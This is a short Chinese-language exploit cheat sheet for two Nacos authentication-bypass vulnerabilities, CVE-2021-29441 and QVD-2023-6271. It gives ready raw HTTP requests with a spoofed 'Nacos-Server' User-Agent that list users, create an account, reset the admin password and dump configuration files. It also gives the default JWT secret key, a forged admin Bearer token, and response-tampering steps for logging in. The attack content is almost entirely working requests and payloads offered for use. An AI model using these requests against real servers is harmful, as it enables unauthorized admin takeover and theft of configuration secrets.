# CVE-2021-29441未授权漏洞

## 查看用户

```
GET /nacos/v1/auth/users?pageNo=1&pageSize=2
...
User-Agent: Nacos-Server
```



## 新增账户

```
POST /nacos/v1/auth/users?username=crow&password=crow

User-Agent: Nacos-Server
...

username=crow&password=crow
```



## 修改密码

```
PUT /nacos/v1/auth/users?accessToken=

User-Agent: Nacos-Server
...

username=nacos&password=nacos
```



## 读取配置文件

```
GET /nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99
或
GET /nacos/v1/cs/configs?search=blur&dataId=&group=&pageNo=1&pageSize=99

User-Agent: Nacos-Server
...
```





# QVD-2023-6271身份绕过漏洞

使用网站：https://jwt.io/

PAYLOAD改为

```
{
  "sub": "nacos",
  "exp": 1678899909
}
```

时间戳需要转换为未来时间

https://tool.lu/timestamp/



VERIFY SIGNATURE打钩且填入key

```
SecretKey012345678901234567890123456789012345678901234567890123456789
```

如下：

![image-20230423150609372](readme/image-20230423150609372.png)





登录改包，新增：

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY4MjMxNDkyN30.xaXvkLYsL0ORhLIRTrnHeogx8RSGG55qzLJXNuobrPc
```



获取以下格式返回包

```
HTTP/1.1 200 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Content-Security-Policy: script-src 'self'
Set-Cookie: JSESSIONID=D90CF6E5B233685E4A39C1B1BDA9F185; Path=/nacos; HttpOnly
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s
Content-Type: application/json
Date: Wed, 15 Mar 2023 14:13:22 GMT
Connection: close
Content-Length: 197


{"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s","tokenTtl":18000,"globalAdmin":true,"username":"nacos"}
```



提取accessToken，重新登录，修改返回包即可登录

